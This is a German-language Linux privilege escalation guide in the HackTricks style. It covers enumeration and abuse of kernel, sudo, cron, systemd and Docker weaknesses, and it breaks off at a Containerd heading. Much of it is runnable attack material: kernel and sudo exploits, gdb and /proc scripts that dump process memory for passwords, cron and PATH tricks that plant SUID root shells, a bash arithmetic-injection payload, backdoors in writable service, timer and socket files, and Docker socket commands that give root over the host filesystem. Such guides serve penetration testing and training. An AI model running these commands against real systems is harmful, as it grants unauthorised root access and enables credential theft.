# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS-Info

Fangen wir an, Informationen über das laufende OS zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Wenn Sie **Schreibrechte an einem Verzeichnis in der Umgebungsvariable `PATH` haben**, können Sie möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Prüfe die kernel-Version und ob es einen exploit gibt, der verwendet werden kann, um privileges zu escalate.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** findest: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Seite zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (im victim ausführen, prüft nur Exploits für Kernel 2.x)

Suche immer **die Kernel-Version in Google**, vielleicht steht deine Kernel-Version in einem kernel exploit und dann kannst du sicher sein, dass dieser Exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die in:
```bash
searchsploit sudo
```
Sie können überprüfen, ob die sudo-Version verwundbar ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) erlauben nicht-privilegierten lokalen Benutzern, ihre Privilegien auf root zu escalate via sudo `--chroot` Option, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) um diese [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) zu exploit. Bevor du den exploit ausführst, stelle sicher, dass deine `sudo`-Version verwundbar ist und dass sie das `chroot`-Feature unterstützt.

Für weitere Informationen, siehe die ursprüngliche [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturprüfung fehlgeschlagen

Sieh dir die **smasher2 box auf HTB** für ein **Beispiel** an, wie diese vuln ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere System enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Verteidigungsmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Prüfe **was gemountet und nicht gemountet ist**, wo und warum. Wenn etwas nicht gemountet ist, könntest du versuchen, es zu mounten und nach privaten Informationen zu suchen
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **any compiler is installed**. Das ist nützlich, wenn du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu compile, auf der du ihn verwenden wirst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare installierte Software

Überprüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um escalating privileges zu erlangen…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, kannst du auch **openVAS** verwenden, um nach veralteter oder verwundbarer Software auf der Maschine zu suchen.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen werden, die größtenteils nutzlos sind. Daher empfiehlt sich der Einsatz von Anwendungen wie OpenVAS oder Ähnlichem, die prüfen, ob eine installierte Softwareversion gegenüber bekannten exploits verwundbar ist._

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Rechte hat, als er sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Prüfe immer, ob [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect`-Parameter in der Kommandozeile des Prozesses überprüft.\ Außerdem **prüfe deine Rechte auf die Prozess-Binaries**, vielleicht kannst du eine überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Manche Dienste eines Servers speichern **credentials in clear text inside the memory**.\ Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Nutzern gehören; daher ist das meist nützlicher, wenn du bereits root bist und weitere credentials entdecken möchtest.\ Vergiss jedoch nicht, dass **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Beachte, dass heutzutage die meisten Maschinen **don't allow ptrace by default**, was bedeutet, dass du nicht andere Prozesse dumpen kannst, die deinem unprivilegierten Benutzer gehören.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debuggt werden, solange sie die gleiche uid haben. Das ist die klassische Funktionsweise, wie ptracing früher funktionierte.
> - **kernel.yama.ptrace_scope = 1**: nur ein Parent-Prozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur Admins können ptrace verwenden, da die CAP_SYS_PTRACE-Fähigkeit erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace verfolgt werden. Nach dem Setzen ist ein Reboot nötig, um ptracing wieder zu erlauben.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Service hast (zum Beispiel), kannst du den Heap auslesen und darin nach credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine bestimmte Prozess-ID, **maps zeigen, wie der Speicher innerhalb des** virtuellen Adressraums dieses Prozesses zugeordnet ist; sie zeigen auch die **Zugriffsrechte jeder zugeordneten Region**. Die **mem** Pseudo-Datei **legt den Speicher des Prozesses selbst offen**. Aus der **maps** Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir verwenden diese Informationen, um **in die mem-Datei zu seeken und alle lesbaren Bereiche zu dumpen** in eine Datei.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels kann über /dev/kmem angesprochen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die **kmem**-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine Linux-Neuinterpretation des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um Prozessspeicher zu dumpen, können Sie Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können die root-Anforderungen manuell entfernen und den Prozess dumpen, der Ihnen gehört
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Methoden zum Dumpen des memory eines Prozesses zu finden) und im memory nach credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **clear text credentials** aus dem **memory** und aus einigen **well known files** stehlen. Es benötigt **root privileges**, um richtig zu funktionieren.

| Funktion                                           | Prozessname         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Suche Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher) läuft als root – webbasierter Scheduler privesc

Wenn ein Web-„Crontab UI“-Panel (alseambusher/crontab-ui) als root läuft und nur an Loopback gebunden ist, kannst du es trotzdem via SSH local port-forwarding erreichen und einen privilegierten Job erstellen, um zu eskalieren.

Typische Kette
- Loopback-only Port entdecken (z. B. 127.0.0.1:8000) und Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Anmeldedaten in operativen Artefakten finden:
- Backups/Skripte mit `zip -P <password>`
- systemd-Unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` enthält
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen high-priv Job und führe ihn sofort aus (legt eine SUID shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
Benutze es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Führe die Crontab UI nicht als root aus; beschränke sie auf einen dedizierten Benutzer mit minimalen Berechtigungen
- Binde an localhost und beschränke zusätzlich den Zugriff über firewall/VPN; verwende Passwörter nicht mehrfach
- Vermeide das Einbetten von secrets in unit files; verwende secret stores oder eine root-only EnvironmentFile
- Aktiviere audit/logging für on-demand job executions



Prüfe, ob ein scheduled job verwundbar ist. Vielleicht kannst du ein Script ausnutzen, das von root ausgeführt wird (wildcard vuln? Kannst du Dateien ändern, die root verwendet? Symlinks nutzen? Bestimmte Dateien in dem Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte für /home/user hat_)

Wenn in dieser crontab der root-Benutzer versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root-Shell bekommen, indem du Folgendes ausführst:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Wenn ein Skript, das von root ausgeführt wird, ein “**\***” in einem Befehl enthält, kannst du das ausnutzen, um unerwartete Dinge zu verursachen (wie privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn der Wildcard einem Pfad wie** _**/some/path/***_ **vorausgeht, ist er nicht verwundbar (sogar** _**./***_ **ist nicht verwundbar).**

Lies die folgende Seite für mehr wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter/variable expansion und command substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let aus. Wenn ein root cron/parser untrusted log fields einliest und diese in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root ausgeführt wird.

- Why it works: In Bash erfolgen die expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Daher wird ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` zuerst substituiert (der Befehl läuft), dann wird die verbleibende numerische `0` für die Arithmetik verwendet, sodass das Script ohne Fehler weiterläuft.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Sorge dafür, dass attacker-controlled text in das geparste log geschrieben wird, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout schreibt (oder leite es um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein **directory, auf das du vollen Zugriff hast**, verwendet, kann es nützlich sein, diesen Ordner zu löschen und **einen symlink folder zu einem anderen zu erstellen**, der ein von dir kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und escalate privileges.

Zum Beispiel, um **alle 0.1s während 1 Minute zu überwachen**, **nach den am seltensten ausgeführten Befehlen zu sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, kannst du Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden Prozess, der startet).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen carriage return nach einem Kommentar setzt** (ohne newline character), und der cron job wird funktionieren. Beispiel (achte auf das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Beschreibbare _.service_ Dateien

Prüfe, ob du eine `.service`-Datei schreiben kannst, falls ja, **kannst du sie ändern**, sodass sie **deine backdoor ausführt**, wenn der Service **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gestartet wird).\
Zum Beispiel erstelle deine backdoor innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare service binaries

Beachte, dass wenn du **write permissions over binaries being executed by services** hast, du diese ändern kannst, um Backdoors einzubauen, sodass beim erneuten Ausführen der services die Backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit folgendem Befehl anzeigen:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, könntest du möglicherweise **escalate privileges**. Du musst nach **relativen Pfaden, die in Service-Konfigurationsdateien verwendet werden** suchen, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann ein **executable** mit dem **same name as the relative path binary** inside the systemd PATH folder you can write, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor will be executed** (unprivilegierte Benutzer können Dienste normalerweise nicht starten/stoppen, prüfe aber, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Dienste mit `man systemd.service`.**

## **Timer**

**Timer** sind systemd unit files, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Events steuern. **Timer** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für Kalenderzeit-Ereignisse und monotone Zeit-Ereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, vorhandene systemd.unit auszuführen (z. B. eine `.service` oder eine `.target`)
```bash
Unit=backdoor.service
```
> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, ist dieser Wert standardmäßig ein service, der denselben Namen wie die timer Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der timer Unit identisch sind, abgesehen vom Suffix.
>
> 

Daher müssten Sie, um diese Berechtigung auszunutzen, Folgendes tun:

- Finden Sie eine systemd Unit (wie eine `.service`), die ein **schreibbares Binary ausführt**
- Finden Sie eine systemd Unit, die einen **relativen Pfad ausführt** und auf den **systemd PATH** Sie **Schreibrechte** haben (um dieses Executable zu impersonieren)

**Mehr über Timer erfahren Sie mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren benötigen Sie root-Rechte und müssen Folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** **aktiviert** wird, indem ein Symlink zu ihm unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` erstellt wird.

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Prozesskommunikation** auf demselben oder verschiedenen Rechnern innerhalb von Client-Server-Modellen. Sie verwenden standardmäßige Unix-Deskriptor-Dateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammengefasst geben sie an, **wo gelauscht wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder die zu überwachende Portnummer, etc.)
- `Accept`: Nimmt ein boolean-Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz erzeugt** und nur der Verbindungs-Socket an diese übergeben. Wenn **false**, werden alle hörenden Sockets selbst an die gestartete Service-Unit **übergeben**, und es wird nur eine Service-Unit für alle Verbindungen erzeugt. Dieser Wert wird bei Datagram-Sockets und FIFOs ignoriert, wo eine einzelne Service-Unit bedingungslos allen eingehenden Traffic verarbeitet. **Standardmäßig false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu schreiben, dass sie `Accept=no` unterstützen.
- `ExecStartPre`, `ExecStartPost`: Nehmen eine oder mehrere Befehlszeilen, die **vor** bzw. **nach** dem Erstellen und Binden der hörenden **Sockets**/FIFOs **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** bzw. **nach** dem Schließen und Entfernen der hörenden **Sockets**/FIFOs **ausgeführt** werden.
- `Service`: Gibt den Namen der **Service**-Unit an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit `Accept=no` erlaubt. Standardmäßig ist dies die Service, die denselben Namen wie die Socket trägt (mit entsprechend ersetztem Suffix). In den meisten Fällen ist die Verwendung dieser Option nicht notwendig.

### Schreibbare .socket-Dateien

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du zu Beginn der `[Socket]`-Sektion etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die backdoor wird ausgeführt, bevor die Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gestartet wird.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Schreibbare Sockets

Wenn du **eine beschreibbare Socket** identifizierst (_jetzt sprechen wir über Unix-Sockets und nicht über die Konfigurations-`.socket`-Dateien_), dann **kannst du mit dieser Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation-Beispiel:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass möglicherweise einige **sockets auf HTTP-Anfragen lauschen** (_ich rede nicht von .socket-Dateien, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **auf eine HTTP-Anfrage antwortet**, dann kannst du **mit ihm kommunizieren** und vielleicht **eine Schwachstelle ausnutzen**.

### Schreibbarer Docker socket

Der Docker socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den `root`-Benutzer und Mitglieder der `docker`-Gruppe beschreibbar. Schreibzugriff auf diesen socket kann zu privilege escalation führen. Hier eine Aufschlüsselung, wie das durchgeführt werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker socket hast, kannst du escalate privileges mit den folgenden Befehlen ausführen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle erlauben es, einen Container mit Root-Zugriff auf das Dateisystem des Hosts zu starten.

#### **Docker API direkt verwenden**

Wenn die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **Docker Images auflisten:** Die Liste der verfügbaren Images abrufen.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Container erstellen:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **An den Container anhängen:** Verwende `socat`, um eine Verbindung zum Container herzustellen und so Befehle darin auszuführen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nach dem Aufbau der `socat`-Verbindung kannst du Befehle direkt im Container ausführen und hast Root-Zugriff auf das Dateisystem des Hosts.

### Weitere Hinweise

Beachte, dass wenn du Schreibrechte am docker-Socket hast, weil du **in der Gruppe `docker`** bist, du [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) hast. Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

